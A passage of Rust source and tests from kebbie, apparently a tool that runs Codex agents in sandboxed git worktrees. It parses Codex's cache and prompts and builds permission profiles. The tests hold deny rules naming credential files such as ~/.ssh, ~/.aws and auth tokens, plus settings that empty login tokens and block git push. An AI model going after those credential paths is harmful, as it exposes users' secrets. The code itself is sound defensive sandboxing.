    pub efforts: Vec<String>,
    pub priority: Option<i64>,
    pub upgrade: Option<String>,
}

// The models Codex fetched for this login, in its models_cache.json, in the file's order; read, never written.
pub fn cached_models(home: &Path) -> Option<Vec<CachedModel>> {
    let cache: Value = serde_json::from_str(&std::fs::read_to_string(home.join("models_cache.json")).ok()?).ok()?;
    let text = |value: &Value| value.as_str().map(str::trim).filter(|text| !text.is_empty()).map(str::to_string);
    Some(cache["models"].as_array()?.iter().filter_map(|model| {
        let slug = text(&model["slug"])?;
        Some(CachedModel {
            name: text(&model["display_name"]).unwrap_or_else(|| slug.clone()),
            listed: model["visibility"] == "list",
            default_effort: text(&model["default_reasoning_level"]),
            efforts: model["supported_reasoning_levels"].as_array().into_iter().flatten().filter_map(|level| text(&level["effort"])).collect(),
            priority: model["priority"].as_i64(),
            upgrade: text(&model["upgrade"]["model"]),
            slug,
        })
    }).collect())
}

// Codex's own record of the folders the user trusted, in its config.toml's [projects] table; read, never written.
pub fn trusted_by_user(dir: &Path) -> bool {
    let config = home().and_then(|home| std::fs::read_to_string(home.join("config.toml")).ok()).and_then(|text| text.parse::<toml::Table>().ok());
    config.is_some_and(|config| trusted_in(&config, dir))
}

fn trusted_in(config: &toml::Table, dir: &Path) -> bool {
    let projects = config.get("projects").and_then(toml::Value::as_table);
    dir.ancestors().any(|folder| folder.to_str().and_then(|folder| projects?.get(folder)?.get("trust_level")?.as_str()) == Some("trusted"))
}

// Codex asks once per folder whether to trust it, with "Trust and continue" first.
pub(crate) fn asks_trust(screen: &str) -> bool {
    screen.contains("Trust this folder?") && screen.contains("Trust and continue")
}

// Codex lists other hooks it has not been told to trust before it runs; they are the user's, so kebbie answers nothing there.
pub(crate) fn asks_hooks(screen: &str) -> bool {
    screen.contains("Hooks need review") && screen.contains("Continue without trusting")
}

// Codex 0.163 onboards a home it finds no login in with its welcome and sign-in screens, and confirms a sign-in on one more; each waits for enter.
pub(crate) fn asks_sign_in(screen: &str) -> bool {
    ["Welcome to Codex", "Choose how you want to use Codex", "Signed in with your ChatGPT account"].iter().any(|text| screen.contains(text))
}

// Codex's update screen (tui/src/update_prompt.rs), for a Codex started without kebbie's NO_UPDATE_CHECK or under a managed config that forces the check.
pub(crate) fn asks_update(screen: &str) -> bool {
    screen.contains("Update available") && screen.contains("Skip until next version")
}

// Codex offers a newer model over the configured one before its composer runs.
pub(crate) fn asks_model(screen: &str) -> bool {
    screen.contains("Try new model") && screen.contains("Use existing model")
}

// What Codex asks on its screen before it takes a prompt; the trust question comes back as AwaitsTrust, which kebbie answers in a folder the user trusts.
pub(crate) fn startup_question(screen: &str) -> Option<Started> {
    if asks_hooks(screen) {
        Some(Started::AwaitsHooks)
    } else if asks_trust(screen) {
        Some(Started::AwaitsTrust)
    } else if asks_update(screen) {
        Some(Started::AwaitsUpdate)
    } else if asks_model(screen) {
        Some(Started::AwaitsModel)
    } else if asks_sign_in(screen) {
        Some(Started::AwaitsSignIn)
    } else {
        None
    }
}

pub const ASKS_KEY: &str = "kebbie_asks";

// Codex 0.163 titles its terminal "<prefix> | <thread title> | <project>" while a view waits on the user, blinking between these two prefixes (tui/src/chatwidget/status_surfaces.rs).
const ACTION_REQUIRED: [&str; 2] = ["[ ! ] Action Required", "[ . ] Action Required"];
const SPINNER: [char; 10] = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'];
const MICROPHONE: char = '●';

pub fn terminal_title(agent: &Value) -> &str {
    agent["terminal_title"].as_str().or(agent["terminal_title_stripped"].as_str()).unwrap_or_default()
}

fn after_action_prefix(title: &str) -> Option<&str> {
    let title = title.trim_start().trim_start_matches(MICROPHONE).trim_start();
    ACTION_REQUIRED.iter().find_map(|prefix| title.strip_prefix(prefix)).map(|rest| rest.trim_start().trim_start_matches('|'))
}

pub fn requires_action(title: &str) -> bool {
    after_action_prefix(title).is_some()
}

// Codex's default title items are activity, thread-name and project-name, joined by " | " and a spinner by a space (tui/src/bottom_pane/title_setup.rs), so the thread title is all but the last part, spinners trimmed.
pub fn thread_title(title: &str) -> Option<String> {
    let rest = after_action_prefix(title).unwrap_or(title);
    let mut parts: Vec<&str> = rest.split(" | ").collect();
    parts.pop();
    let thread = parts.join(" | ");
    let thread = thread.trim_matches(|character: char| character.is_whitespace() || character == MICROPHONE || SPINNER.contains(&character));
    (!thread.is_empty()).then(|| thread.to_string())
}

// A title kept from an action-required screen reads "Action Required | <thread> | <project>", readable having trimmed its "[ ! ] "; any other kept title is None, so a Claude title that opens with the same words stays whole.
pub fn kept_thread_title(kept: &str) -> Option<Option<String>> {
    let rest = kept.strip_prefix("Action Required |")?;
    Some(thread_title(&format!("{} |{rest}", ACTION_REQUIRED[0])))
}

#[derive(Debug, PartialEq)]
pub enum Waits {
    OnView,
    OnStartUp(Started),
}

// The one place that decides what a Codex waits on: a view titled Action Required at any point in its session, a start-up question on its screen only while unprompted, as past its first prompt the same words on screen, in code or a diff, are no question.
pub fn waits_on(title: &str, unprompted: impl FnOnce() -> bool, screen: impl FnOnce() -> Option<String>) -> Option<Waits> {
    if requires_action(title) {
        return Some(Waits::OnView);
    }
    if !unprompted() {
        return None;
    }
    screen().as_deref().and_then(startup_question).map(Waits::OnStartUp)
}

// herdr calls a Codex idle on a waiting view and on a start-up question alike, so kebbie marks it blocked, with what it asks on a start-up question.
pub fn with_question(mut agent: Value, unprompted: impl FnOnce() -> bool, read: impl FnOnce(&str) -> Option<String>) -> Value {
    if super::Agent::of(&agent) != Some(super::Agent::Codex) {
        return agent;
    }
    let waiting = !matches!(agent["agent_status"].as_str(), Some("working" | "blocked"));
    let pane = agent["pane_id"].as_str().map(str::to_string);
    match waits_on(terminal_title(&agent), || waiting && unprompted(), || pane.as_deref().and_then(read)) {
        Some(Waits::OnView) => agent["agent_status"] = json!("blocked"),
        Some(Waits::OnStartUp(asked)) => if let Some(asks) = asked.asks() {
            agent["agent_status"] = json!("blocked");
            agent[ASKS_KEY] = json!(asks);
        },
        None => {}
    }
    agent
}

pub fn read_question(agent: &Value, address: &str) -> Value {
    with_question(agent.clone(), || crate::tasks::awaits_first_prompt(address), |pane| crate::herdr::read_agent(pane).ok())
}

pub(crate) fn trust_selected(screen: &str) -> bool {
    screen.lines().any(|line| line.trim_start().starts_with('›') && line.contains("Trust and continue"))
}

// Codex 0.163 opens a view that waits on the user at one of these lines: the approval overlay's titles (tui/src/bottom_pane/approval_overlay.rs), a verification's (user_verification.rs), and the count over a question or a form's field (request_user_input, mcp_server_elicitation.rs).
const VIEW_TITLES: [&str; 3] = ["Would you like to", "Do you want to approve", "needs your approval"];
const VIEW_COUNTS: [&str; 2] = ["Question ", "Field "];

fn opens_view(line: &str) -> bool {
    VIEW_TITLES.iter().any(|title| line.contains(title))
        || VIEW_COUNTS.iter().any(|count| line.strip_prefix(count).and_then(|rest| rest.split_once('/')).is_some_and(|(at, _)| !at.is_empty() && at.chars().all(|character| character.is_ascii_digit())))
}

// Codex focuses a list's option with › (tui/src/bottom_pane/list_selection_view.rs) and opens its transcript lines with •.
pub(crate) const SCREENS: Screens = Screens { kind: "codex", name: "Codex", asks_trust, trust_selected, toward_trust: "up", held: |screen| startup_question(screen).filter(|asked| *asked != Started::AwaitsTrust), running: |_| Started::Ready, input_shown: |screen| draft(screen) != Draft::Unreadable, focus: '›', said: '•', opens: opens_view, keyed: true };

pub fn start(name: &str, pane: &str, args: &[&str], trusted: bool) -> Result<Started> {
    super::claude::start_with(&SCREENS, name, pane, args, trusted)
}

pub fn end(pane: &str) -> Result<()> {
    super::claude::end_agent("Codex", pane)
}

// kebbie's Codex hooks, run by the plugin's launcher: outside a kebbie task's worktree each is silent.
pub fn hook(input: &str) -> String {
    let payload = Payload::parse(input);
    let cwd = payload.cwd().map(PathBuf::from).or_else(|| std::env::current_dir().ok());
    let Some(me) = cwd.as_deref().and_then(crate::peers::me).filter(|me| me != crate::status::LEAD_LABEL) else { return String::new() };
    match payload.event() {
        Some("SessionStart") => session_start(&me, &payload, crate::lead::roles_dir().ok().as_deref()),
        Some("PreToolUse") => crate::push_guard::answer(&payload, cwd.as_deref().map_or(crate::kube_guard::Cluster::None, crate::tasks::cluster_at)).render(),
        Some("UserPromptSubmit" | "Stop") => {
            let _ = crate::messages::flush();
            crate::report::answer(&payload).render()
        }
        _ => String::new(),
    }
}

fn session_start(me: &str, input: &Payload, roles: Option<&Path>) -> String {
    if let Some(session) = input.session_id().filter(|id| !id.is_empty()) {
        let _ = crate::tasks::record_session(me, session);
    }
    let Some(role) = roles.and_then(|dir| std::fs::read_to_string(dir.join(format!("{me}.md"))).ok()).filter(|role| !role.trim().is_empty()) else { return String::new() };
    Answer::Context { event: json!("SessionStart"), text: role }.render()
}

#[derive(Debug, PartialEq)]
pub struct Availability {
    pub binary: Option<PathBuf>,
    pub version: Option<String>,
    pub plugin: Installed,
}

pub fn availability(path: &[PathBuf], home: Option<&Path>, kebbie: &str) -> Availability {
    let binary = crate::doctor::which("codex", path);
    let version = binary.as_ref().and_then(|binary| crate::sh::run(&binary.to_string_lossy(), &["--version"], None).ok()).map(|text| text.trim().to_string());
    Availability { binary, version, plugin: home.map_or(Installed::Missing, |home| installed(home, kebbie)) }
}

impl Availability {
    pub fn line(&self) -> String {
        let binary = match (&self.binary, &self.version) {
            (Some(binary), Some(version)) => format!("{version} at {}", binary.display()),
            (Some(binary), None) => format!("{} (its version does not read)", binary.display()),
            (None, _) => "codex is not on PATH".to_string(),
        };
        format!("{binary} · {}", self.plugin_line())
    }

    pub fn short_line(&self) -> String {
        let binary = match (&self.binary, &self.version) {
            (Some(_), Some(version)) => version.clone(),
            (Some(_), None) => "codex, its version does not read".to_string(),
            (None, _) => "codex is not on PATH".to_string(),
        };
        format!("{binary} · {}", self.plugin_line())
    }

    fn plugin_line(&self) -> String {
        match &self.plugin {
            Installed::Current => "kebbie's plugin installed".to_string(),
            Installed::Missing => "kebbie's plugin not installed: kebbie setup codex".to_string(),
            Installed::Stale(_) => "kebbie's plugin out of date: kebbie setup codex".to_string(),
            Installed::Replaced(_) => "kebbie's plugin replaced by a copy Codex installed: kebbie setup codex".to_string(),
            Installed::UnderOldId(_) => "kebbie's plugin under kebbie@kebbie: kebbie setup codex".to_string(),
        }
    }
}

// What in the user's own Codex config keeps kebbie's hooks from running, read only: hooks turned off, or one of kebbie's turned off in /hooks.
pub fn hooks_blocked(config: Option<&toml::Table>) -> Vec<String> {
    let Some(config) = config else { return Vec::new() };
    let mut blocked = Vec::new();
    if config.get("features").and_then(|features| features.get("hooks").or_else(|| features.get("codex_hooks"))).and_then(toml::Value::as_bool) == Some(false) {
        blocked.push("[features] hooks = false turns every hook off".to_string());
    }
    let state = config.get("hooks").and_then(|hooks| hooks.get("state")).and_then(toml::Value::as_table);
    for hook in &HOOKS {
        if state.and_then(|state| state.get(&hook_key(hook))).and_then(|entry| entry.get("enabled")).and_then(toml::Value::as_bool) == Some(false) {
            blocked.push(format!("its {} hook is turned off in /hooks", hook.event));
        }
    }
    blocked
}

#[cfg(test)]
pub const CACHE_FIXTURE: &str = r#"{"fetched_at":"2026-10-30T08:00:00Z","etag":"W/\"1\"","client_version":"0.163.0","models":[
{"slug":"gpt-6.1-sol","display_name":"GPT-6.1-Sol","description":"Frontier","default_reasoning_level":"low","supported_reasoning_levels":[{"effort":"low","description":"Fast"},{"effort":"medium","description":"Balanced"},{"effort":"high","description":"Deep"},{"effort":"xhigh","description":"Deeper"},{"effort":"max","description":"Most"},{"effort":"ultra","description":"Agents"}],"visibility":"list","priority":1},
{"slug":"gpt-6-astra","display_name":"GPT-6-Astra","default_reasoning_level":"medium","supported_reasoning_levels":[{"effort":"low","description":""},{"effort":"medium","description":""},{"effort":"high","description":""}],"visibility":"list","priority":2},
{"slug":"gpt-5.1-codex-max","display_name":"gpt-5.1-codex-max","default_reasoning_level":"medium","supported_reasoning_levels":[{"effort":"medium","description":""}],"visibility":"hide","priority":9,"upgrade":{"model":"gpt-6-astra","migration_markdown":"Try GPT-6-Astra"}},
{"slug":"gpt-6.1-terra","display_name":"GPT-6.1 Terra","default_reasoning_level":"medium","supported_reasoning_levels":[{"effort":"medium","description":""},{"effort":"high","description":""}],"visibility":"list","priority":3}
]}"#;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn codexs_model_cache_lists_its_picker_models_in_the_files_order_with_their_efforts() {
        let home = crate::sh::test_dir("codex-models-cache");
        assert_eq!(cached_models(&home), None, "no cache, no list");
        std::fs::write(home.join("models_cache.json"), "{\"models\": [").unwrap();
        assert_eq!(cached_models(&home), None, "a cache that does not parse is no list");
        std::fs::write(home.join("models_cache.json"), super::CACHE_FIXTURE).unwrap();
        let models = cached_models(&home).unwrap();
        let listed: Vec<(&str, &str)> = models.iter().filter(|model| model.listed).map(|model| (model.slug.as_str(), model.name.as_str())).collect();
        assert_eq!(listed, [("gpt-6.1-sol", "GPT-6.1-Sol"), ("gpt-6-astra", "GPT-6-Astra"), ("gpt-6.1-terra", "GPT-6.1 Terra")]);
        assert_eq!(models[0].efforts, ["low", "medium", "high", "xhigh", "max", "ultra"]);
        assert_eq!(models[0].default_effort.as_deref(), Some("low"));
        assert!(models.iter().any(|model| model.slug == "gpt-5.1-codex-max" && !model.listed), "a hidden model is known, never listed");
        std::fs::remove_dir_all(home).unwrap();
    }

    fn profile(model: Option<&str>, effort: Option<&str>) -> Profile {
        Profile { agent: super::super::Agent::Codex, model: model.map(str::to_string), effort: effort.map(str::to_string), ..crate::profiles::built_in(crate::profiles::TASK).unwrap() }
    }

    fn after<'a>(args: &'a [String], flag: &str) -> Vec<&'a str> {
        args.windows(2).filter(|pair| pair[0] == flag).map(|pair| pair[1].as_str()).collect()
    }

    fn files<'a>(sandboxed: bool, tmp: Option<&'a Path>, codex_roots: &'a [String]) -> super::super::TaskFiles<'a> {
        super::super::TaskFiles { address: "billing@app", settings: Path::new("/unused"), role: Path::new("/unused"), sandboxed, git_dir: tmp.and_then(Path::parent), tmp, hidden: &[], codex_roots }
    }

    const TMP: &str = "/src/app/.git/worktrees/1/kebbie-tmp";

    fn value_of<'a>(args: &'a [String], key: &str) -> Vec<&'a str> {
        after(args, "-c").into_iter().filter_map(|value| value.strip_prefix(key).and_then(|rest| rest.strip_prefix('='))).collect()
    }

    fn toml_value(value: &str) -> toml::Value {
        format!("v = {value}").parse::<toml::Table>().unwrap_or_else(|error| panic!("{value}: {error}")).remove("v").unwrap()
    }

    #[test]
    fn an_ops_codex_task_keeps_the_users_ssh_agent_while_a_plain_one_has_it_emptied() {
        let ops = Profile { agent: super::super::Agent::Codex, ..crate::profiles::built_in(crate::profiles::OPS).unwrap() };
        for sandboxed in [true, false] {
            let set = |profile: &Profile| value_of(&start_args(None, profile, &files(sandboxed, Some(Path::new(TMP)), &[]), &Session::New("ignored".to_string())), "shell_environment_policy.set").concat();
            let (ops_set, task_set) = (set(&ops), set(&profile(None, None)));
            assert!(!ops_set.contains("SSH_AUTH_SOCK") && task_set.contains("SSH_AUTH_SOCK=\"\""), "ops inherits Codex's own agent socket, a plain task gets it emptied: {ops_set}");
            assert!(ops_set.contains("GH_TOKEN=\"\"") && ops_set.contains("GIT_ASKPASS=\"false\"") && ops_set.contains("\"credential.helper\"") && ops_set.contains("\"url.kebbie-blocks-push://.pushInsteadOf\""), "every other login stays dropped and the push rewrite stays: {ops_set}");
        }
    }

    #[test]
    fn a_codex_task_whose_profile_names_a_kubeconfig_gets_it_as_kubeconfig_and_its_shell_still_reads_none_of_it() {
        let mut kube = profile(None, None);
        kube.sandbox.kubeconfig = Some("/etc/kebbie/deploy.yaml".to_string());
        for sandboxed in [true, false] {
            let set = |profile: &Profile| value_of(&start_args(None, profile, &files(sandboxed, Some(Path::new(TMP)), &[]), &Session::New("ignored".to_string())), "shell_environment_policy.set").concat();
            assert!(set(&kube).contains("KUBECONFIG=\"/etc/kebbie/deploy.yaml\"") && !set(&profile(None, None)).contains("KUBECONFIG"), "{}", set(&kube));
        }
        let args = start_args(None, &kube, &files(true, Some(Path::new(TMP)), &[]), &Session::New("x".to_string()));
        let filesystem = toml_value(value_of(&args, "permissions.kebbie-task")[0])["filesystem"].as_table().unwrap().clone();
        for denied in ["~/.kube", "/etc/kebbie/deploy.yaml"] {
            assert_eq!(filesystem.get(denied).and_then(toml::Value::as_str), Some("deny"), "{denied}: {filesystem:?}");
        }
    }

    #[test]
    fn a_sandboxed_codex_task_writes_only_its_workspace_and_asks_before_leaving_it() {
        let args = start_args(None, &profile(Some("gpt-5.5"), Some("high")), &files(true, Some(Path::new(TMP)), &[]), &Session::New("ignored".to_string()));
        assert!(after(&args, "--sandbox").is_empty() && !args.iter().any(|word| word == "--approve-for-me"), "--sandbox would bring back Codex's own workspace-write over kebbie's profile: {args:?}");
        assert_eq!(value_of(&args, "default_permissions"), ["\"kebbie-task\""]);
        assert_eq!(after(&args, "--ask-for-approval"), ["on-request"]);
        assert_eq!(after(&args, "--model"), ["gpt-5.5"]);
        let config = after(&args, "-c");
        assert!(config.contains(&"model_reasoning_effort=\"high\""), "{config:?}");
        assert!(config.contains(&"shell_environment_policy.set={GIT_CONFIG_COUNT=\"8\",GIT_CONFIG_KEY_0=\"url.kebbie-blocks-push://.pushInsteadOf\",GIT_CONFIG_VALUE_0=\"\",GIT_CONFIG_KEY_1=\"protocol.kebbie-blocks-push.allow\",GIT_CONFIG_VALUE_1=\"never\",GIT_CONFIG_KEY_2=\"url./.pushInsteadOf\",GIT_CONFIG_VALUE_2=\"/\",GIT_CONFIG_KEY_3=\"url../.pushInsteadOf\",GIT_CONFIG_VALUE_3=\"./\",GIT_CONFIG_KEY_4=\"url.../.pushInsteadOf\",GIT_CONFIG_VALUE_4=\"../\",GIT_CONFIG_KEY_5=\"url.file://.pushInsteadOf\",GIT_CONFIG_VALUE_5=\"file://\",GIT_CONFIG_KEY_6=\"credential.helper\",GIT_CONFIG_VALUE_6=\"\",GIT_CONFIG_KEY_7=\"http.extraHeader\",GIT_CONFIG_VALUE_7=\"\",SSH_AUTH_SOCK=\"\",GH_TOKEN=\"\",GITHUB_TOKEN=\"\",GH_ENTERPRISE_TOKEN=\"\",GITHUB_ENTERPRISE_TOKEN=\"\",GIT_TERMINAL_PROMPT=\"0\",GIT_ASKPASS=\"false\",SSH_ASKPASS=\"false\",SSH_ASKPASS_REQUIRE=\"never\",KEBBIE_ADDRESS=\"billing@app\",TMPDIR=\"/src/app/.git/worktrees/1/kebbie-tmp\"}"), "the push block and the dropped logins reach every command it runs, local paths let through: {config:?}");
        assert!(config.contains(&"plugins.kebbie@kebbie-tasks.enabled=true") && config.iter().any(|value| value.starts_with("hooks.state={\"kebbie@kebbie-tasks:hooks/hooks.json:session_start:0:0\"={trusted_hash=\"sha256:")), "{config:?}");
        assert!(!args.iter().any(|word| word.contains("ignored")), "Codex picks a new session's id itself");
        assert!(!args.iter().any(|word| word.starts_with("--dangerously") || word.contains("danger-full-access") || word.starts_with("sandbox_workspace_write")), "{args:?}");
    }

    #[test]
    fn a_sandboxed_codex_tasks_profile_lets_a_commit_write_its_git_dirs_but_nothing_git_runs_as_the_user() {
        let args = start_args(None, &profile(None, None), &files(true, Some(Path::new(TMP)), &["/elsewhere".to_string()]), &Session::New("x".to_string()));
        let [permissions] = value_of(&args, "permissions.kebbie-task")[..] else { panic!("one profile: {args:?}") };
        let written = toml_value(permissions);
        let filesystem = written["filesystem"].as_table().unwrap();
        let access = |path: &str| filesystem.get(path).and_then(toml::Value::as_str);
        for root in ["/src/app/.git/objects", "/src/app/.git/refs", "/src/app/.git/logs", "/src/app/.git/worktrees/1"] {
            assert_eq!(access(root), Some("write"), "{root}: a commit writes there: {filesystem:?}");
        }
        for kept in ["/src/app/.git/config", "/src/app/.git/hooks", "/src/app/.git/modules", "/src/app/.git/worktrees/1/config.worktree", "/src/app/.git/worktrees/1/kebbie-hooks", "/src/app/.git/worktrees/1/commondir", "/src/app/.git/worktrees/1/gitdir"] {
            assert_eq!(access(kept), Some("read"), "{kept}: git runs or follows it as the user, the push block among it: {filesystem:?}");
        }
        assert_eq!(access(":root"), Some("read"));
        assert_eq!(filesystem[":workspace_roots"]["."].as_str(), Some("write"));
        assert_eq!(access("~/.npm"), Some("write"), "the sandbox's writes, as Claude's sandbox has them");
        assert!(access("/src/app/.git").is_none() && access("/src/app/.git/worktrees").is_none() && access("/elsewhere").is_none(), "never the whole git dir, another slot's or the user's legacy roots: {filesystem:?}");
        let domains: Vec<&str> = written["network"]["domains"].as_table().unwrap().iter().map(|(domain, rule)| { assert_eq!(rule.as_str(), Some("allow")); domain.as_str() }).collect();
        let mut wanted = crate::sandbox::DOMAINS.to_vec();
        wanted.sort();
        assert_eq!(domains, wanted, "the network reaches the sandbox's hosts alone");
        assert_eq!(written["network"]["enabled"].as_bool(), Some(true));
        assert_eq!(value_of(&args, "features.network_proxy"), ["true"], "Codex keeps to the domains only through its proxy");
        let mut closed = profile(None, None);
        closed.sandbox.domains = Some(Vec::new());
        let shut = start_args(None, &closed, &files(true, Some(Path::new(TMP)), &[]), &Session::New("x".to_string()));
        assert_eq!(toml_value(value_of(&shut, "permissions.kebbie-task")[0])["network"].as_table().unwrap().get("enabled").and_then(toml::Value::as_bool), Some(false), "no hosts, no network");
    }

    #[test]
    fn a_sandboxed_codex_tasks_shell_reads_no_credential_nor_kebbies_state_and_config() {
        let args = start_args(None, &profile(None, None), &files(true, Some(Path::new(TMP)), &[]), &Session::New("x".to_string()));
        let written = toml_value(value_of(&args, "permissions.kebbie-task")[0]);
        let filesystem = written["filesystem"].as_table().unwrap();
        let protected = crate::sandbox::Protected::here();
        let secrets = protected.secrets();
        for secret in ["~/.ssh", "~/.config/gh", "~/.codex/auth.json", "~/.claude/.credentials.json", "~/.aws", "~/.kube", "~/.docker/config.json"].map(str::to_string).into_iter().chain([protected.state.display().to_string(), crate::config::path().display().to_string()]) {
            assert!(secrets.contains(&secret), "{secret} in {secrets:?}");
            assert_eq!(filesystem.get(&secret).and_then(toml::Value::as_str), Some("deny"), "{secret}: {filesystem:?}");
        }
        for open in ["/src/app/.git/worktrees/1", "/src/app/.git/objects"] {
            assert!(!secrets.iter().any(|secret| Path::new(open).starts_with(secret)), "{open} stays the task's to write");
        }
    }

    #[test]
    fn codexs_own_sandbox_keeps_kebbies_state_from_a_task_and_lets_it_read_and_write_its_worktree_and_git_dir() {
        let path: Vec<PathBuf> = std::env::var_os("PATH").map(|path| std::env::split_paths(&path).collect()).unwrap_or_default();
        let Some(codex) = crate::doctor::which("codex", &path) else {
            eprintln!("skipped: no codex on PATH to run its sandbox");
            return;
        };
        let base = crate::sh::test_dir("codex-denies").canonicalize().unwrap();
        let (worktree, git_dir) = (base.join("wt1.app"), base.join("app/.git/worktrees/1"));
        std::fs::create_dir_all(&worktree).unwrap();
        std::fs::create_dir_all(git_dir.join("kebbie-plan")).unwrap();
        std::fs::write(worktree.join("a.rs"), "fine").unwrap();
        let state = crate::sandbox::Protected::here().state;
        std::fs::create_dir_all(state.join("push-tokens")).unwrap();
        std::fs::write(state.join("push-tokens/0123"), "").unwrap();
        let profile = permission_profile(&crate::sandbox::Policy::default(), Some(&git_dir), cfg!(target_os = "macos"));
        let run = |script: &str| std::process::Command::new(&codex).current_dir(&worktree).args(["sandbox", "-c", &format!("default_permissions={}", toml_string(PERMISSIONS)), "-c", &profile, "-c", "features.network_proxy=true", "--", "sh", "-c", script]).output().unwrap();
        let read = run(&format!("cat a.rs && echo plan > {0}/kebbie-plan/plan.md && cat {0}/kebbie-plan/plan.md", git_dir.display()));
        assert!(read.status.success(), "the worktree and its git dir stay the task's: {}", String::from_utf8_lossy(&read.stderr));
        let denied = run(&format!("ls {}", state.join("push-tokens").display()));
        assert!(!denied.status.success() && !String::from_utf8_lossy(&denied.stdout).contains("0123"), "kebbie's state stays out of the task's shell: {}", String::from_utf8_lossy(&denied.stdout));
        std::fs::remove_dir_all(base).unwrap();
    }

    #[test]
    fn git_stages_and_commits_in_a_linked_worktree_inside_codexs_sandbox_with_the_sandbox_on_or_off() {
        let path: Vec<PathBuf> = std::env::var_os("PATH").map(|path| std::env::split_paths(&path).collect()).unwrap_or_default();
        let Some(codex) = crate::doctor::which("codex", &path) else {
            eprintln!("skipped: no codex on PATH to run its sandbox");
            return;
        };
        let base = crate::sh::test_dir("codex-commits").canonicalize().unwrap();
        let main = base.join("app");
        std::fs::create_dir_all(&main).unwrap();
        let git = |dir: &Path, args: &[&str]| assert!(std::process::Command::new("git").current_dir(dir).args(["-c", "user.name=t", "-c", "user.email=t@t"]).args(args).output().unwrap().status.success(), "git {args:?}");
        git(&main, &["init", "-q", "-b", "main"]);
        std::fs::write(main.join("a.rs"), "a").unwrap();
        git(&main, &["add", "a.rs"]);
        git(&main, &["commit", "-qm", "a"]);
        git(&main, &["worktree", "add", "-q", "../wt1.app", "-b", "task"]);
        let worktree = base.join("wt1.app");
        let git_dir = crate::sandbox::git_dir_of(&worktree);
        let commit = |file: &str, config: &[String]| {
            let script = format!("echo x > {file} && git add {file} && git -c user.name=t -c user.email=t@t commit -qm {file}");
            let run = std::process::Command::new(&codex).current_dir(&worktree).arg("sandbox").args(config).args(["--", "sh", "-c", &script]).output().unwrap();
            (run.status.success(), String::from_utf8_lossy(&run.stderr).to_string())
        };
        let on = ["-c".to_string(), format!("default_permissions={}", toml_string(PERMISSIONS)), "-c".to_string(), permission_profile(&crate::sandbox::Policy::default(), Some(&git_dir), cfg!(target_os = "macos")), "-c".to_string(), "features.network_proxy=true".to_string()];
        let (staged, said) = commit("on.rs", &on);
        assert!(staged, "a sandboxed task stages and commits without leaving the sandbox, so it never asks: {said}");
        let workspace = ["-c".to_string(), "sandbox_mode=\"workspace-write\"".to_string()];
        let off: Vec<String> = workspace.iter().cloned().chain(unsandboxed_args(&crate::sandbox::Policy::default(), Some(&git_dir), &[])).collect();
        let (staged, said) = commit("off.rs", &off);
        assert!(staged, "with task.sandbox off, kebbie's writable roots let the user's workspace-write commit: {said}");
        assert!(!commit("bare.rs", &workspace).0, "Codex's own workspace-write keeps a worktree's git dir read-only, which is what made a task ask to run git add");
        std::fs::remove_dir_all(base).unwrap();
    }

    #[test]
    fn a_tasks_role_runs_git_in_the_sandbox_and_never_asks_to_leave_it_for_git() {
        let role = include_str!("../../roles/task.md");
        assert!(role.contains("Git in your worktree runs inside the sandbox") && role.contains("run `git add`, `git commit`, `git rebase`, `git restore` and the like as they are, and never ask to run them outside the sandbox"), "a role that only says .git is the user's reads to Codex as asking before every git add");
    }

    #[test]
    fn an_unsandboxed_codex_task_commits_and_reaches_the_network_under_the_users_own_sandbox_mode() {
        let args = start_args(None, &profile(None, None), &files(false, Some(Path::new(TMP)), &["~/code".to_string()]), &Session::New("x".to_string()));
        let [roots] = value_of(&args, "sandbox_workspace_write.writable_roots")[..] else { panic!("one list: {args:?}") };
        let roots: Vec<String> = toml_value(roots).as_array().unwrap().iter().map(|root| root.as_str().unwrap().to_string()).collect();
        let home = std::env::var("HOME").unwrap();
        let caches: Vec<String> = [".cargo/registry", ".cargo/git", ".npm", ".cache"].iter().map(|cache| format!("{home}/{cache}")).collect();
        let commits = ["/src/app/.git/objects", "/src/app/.git/refs", "/src/app/.git/logs", "/src/app/.git/worktrees/1"].map(str::to_string);
        let wanted: Vec<String> = std::iter::once("~/code".to_string()).chain(caches.iter().cloned()).chain(commits.iter().cloned()).collect();
        assert_eq!(roots, wanted, "the user's own roots stay, as a -c list replaces them, and the package caches open as with the sandbox on");
        assert_eq!(value_of(&args, "sandbox_workspace_write.network_access"), ["true"], "Claude runs unsandboxed here, network and all");
        assert!(after(&args, "--sandbox").is_empty() && value_of(&args, "default_permissions").is_empty(), "the user's own sandbox mode decides: {args:?}");
        let main = start_args(None, &profile(None, None), &files(false, Some(Path::new("/src/app/.git/kebbie-tmp")), &[]), &Session::New("x".to_string()));
        assert_eq!(toml_value(value_of(&main, "sandbox_workspace_write.writable_roots")[0]).as_array().unwrap().len(), 4 + 3, "a main checkout's git dir is the common dir");
        let mut own = profile(None, None);
        own.sandbox.writes = Some(["~/.gradle", "/opt/build", "relative/dir"].map(str::to_string).to_vec());
        let configured = start_args(None, &own, &files(false, Some(Path::new(TMP)), &[]), &Session::New("x".to_string()));
        let roots: Vec<String> = toml_value(value_of(&configured, "sandbox_workspace_write.writable_roots")[0]).as_array().unwrap().iter().map(|root| root.as_str().unwrap().to_string()).collect();
        let wanted: Vec<String> = [format!("{home}/.gradle"), "/opt/build".to_string()].into_iter().chain(commits.iter().cloned()).collect();
        assert_eq!(roots, wanted, "a profile's own allow_write replaces the caches, ~/ expanded and a relative path left out");
        for mode in ["plan", "bypassPermissions"] {
            let args = start_args(Some(mode), &profile(None, None), &files(false, Some(Path::new(TMP)), &[]), &Session::New("x".to_string()));
            assert!(!args.iter().any(|word| word.starts_with("sandbox_workspace_write") || word.starts_with("default_permissions")), "{mode}: {args:?}");
        }
    }

    #[test]
    fn the_codex_sandboxs_keys_parse_as_codexs_own_config_types() {
        #[derive(serde::Deserialize)]
        #[serde(deny_unknown_fields)]
        #[allow(dead_code)]
        struct SandboxWorkspaceWrite { #[serde(default)] writable_roots: Vec<String>, #[serde(default)] network_access: bool, #[serde(default)] exclude_tmpdir_env_var: bool, #[serde(default)] exclude_slash_tmp: bool }
        #[derive(serde::Deserialize)]
        #[serde(deny_unknown_fields)]
        #[allow(dead_code)]
        struct Network { enabled: Option<bool>, allow_local_binding: Option<bool>, domains: Option<std::collections::BTreeMap<String, String>> }
        #[derive(serde::Deserialize)]
        #[serde(deny_unknown_fields)]
        #[allow(dead_code)]
        struct PermissionProfile { filesystem: Option<toml::Table>, network: Option<Network> }
